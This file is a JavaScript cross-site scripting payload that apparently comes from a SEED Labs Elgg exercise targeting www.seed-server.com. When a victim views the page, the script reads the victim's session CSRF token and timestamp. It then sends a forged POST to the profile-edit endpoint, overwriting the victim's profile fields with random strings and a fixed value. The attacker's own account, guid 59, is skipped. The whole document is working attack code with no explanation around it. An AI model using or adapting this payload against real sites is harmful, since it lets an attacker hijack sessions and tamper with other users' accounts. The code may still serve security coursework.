<script type="text/javascript">


    window.onload = function () {
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        //Construct the content of your url.
        var sendurl = "http://www.seed-server.com/action/profile/edit";
        //generate an array of 10 random strings
        var randomStrings = [];
        for (var i = 0; i < 10; i++) {
            randomStrings.push(Math.random().toString(36).substring(7));
        }
        var name = elgg.session.user.name;
        var content = token + ts + '&name=' + name
            + '&description=1905077&accesslevel[description]=1'
            + '&briefdescription=' + randomStrings[0] + '&accesslevel[briefdescription]=1'
            + '&location=' + randomStrings[1] + '&accesslevel[location]=1'
            + '&interests=' + randomStrings[2] + '&accesslevel[interests]=1'
            + '&skills=' + randomStrings[3] + '&accesslevel[skills]=1'
            + '&contactemail=' + randomStrings[4] + '&accesslevel[contactemail]=1'
            + '&phone=' + randomStrings[5] + '&accesslevel[phone]=1'
            + '&mobile=' + randomStrings[6] + '&accesslevel[mobile]=1'
            + '&website=' + randomStrings[7] + '&accesslevel[website]=1'
            + '&twitter=' + randomStrings[8] + '&accesslevel[twitter]=1'
            + '&guid=' + elgg.session.user.guid;

        if (elgg.session.user.guid != 59) {
            //Create and send Ajax request to modify profile
            var Ajax = null;
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
